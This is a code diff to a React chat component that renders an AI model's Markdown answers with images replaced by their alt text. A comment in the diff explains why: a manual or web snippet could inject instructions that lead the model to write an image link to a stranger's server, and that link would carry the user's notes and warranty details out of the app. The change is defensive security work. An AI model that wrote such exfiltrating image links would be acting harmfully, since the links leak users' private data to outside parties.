@@ -1,7 +1,25 @@
 import { BookmarkIcon, BookOpenIcon, BrainIcon, GlobeIcon, RotateCcwIcon, ScanSearchIcon, StickyNoteIcon } from "lucide-react"
 import { cn } from "@/lib/utils"
 import type { ChatMessage, ChatSource } from "@/modules/knowledge/services/chatService"
-import ReactMarkdown from "react-markdown"
+import ReactMarkdown, { type Components } from "react-markdown"
+
+/**
+ * How an AI answer's Markdown is drawn: everything as usual, except that an
+ * image is never an image (Codex review S6).
+ *
+ * A browser fetches an image's URL the moment it renders, with no tap. A
+ * manual or a web snippet that talks the model into writing
+ * `![x](https://elsewhere/?d=…)` would therefore send whatever the model put
+ * in that address — the notes and warranty details in the same prompt — to a
+ * stranger's server, and the app's CSP allows images from any https host.
+ * Answers have no use for images (manual pages open in the app's own viewer),
+ * so the alt text stands in the image's place and no request is ever made.
+ * Links stay: following one takes a tap. Raw HTML is never rendered at all
+ * (react-markdown's default; no rehype-raw here).
+ */
+const ANSWER_MARKDOWN: Components = {
+  img: ({ alt }) => (alt ? <span>{alt}</span> : null),
+}
 
 /**
  * HH-28: "empty answers say so honestly." An answer that finished with no text
@@ -115,7 +133,7 @@ export function ChatMessageBubble({
               "text-sm break-words",
               !isUser && "prose prose-sm max-w-none prose-p:my-1 prose-headings:my-2 prose-ul:my-1 prose-ol:my-1 prose-li:my-0 prose-blockquote:my-1 prose-blockquote:border-l-2 prose-blockquote:pl-3 prose-blockquote:text-muted-foreground dark:prose-invert"
             )}>
-              {isUser ? message.content : <ReactMarkdown>{message.content}</ReactMarkdown>}
+              {isUser ? message.content : <ReactMarkdown components={ANSWER_MARKDOWN}>{message.content}</ReactMarkdown>}
               {message.isStreaming && (
                 <span className="inline-block w-2 h-4 ml-0.5 bg-current animate-pulse align-middle" />
               )}
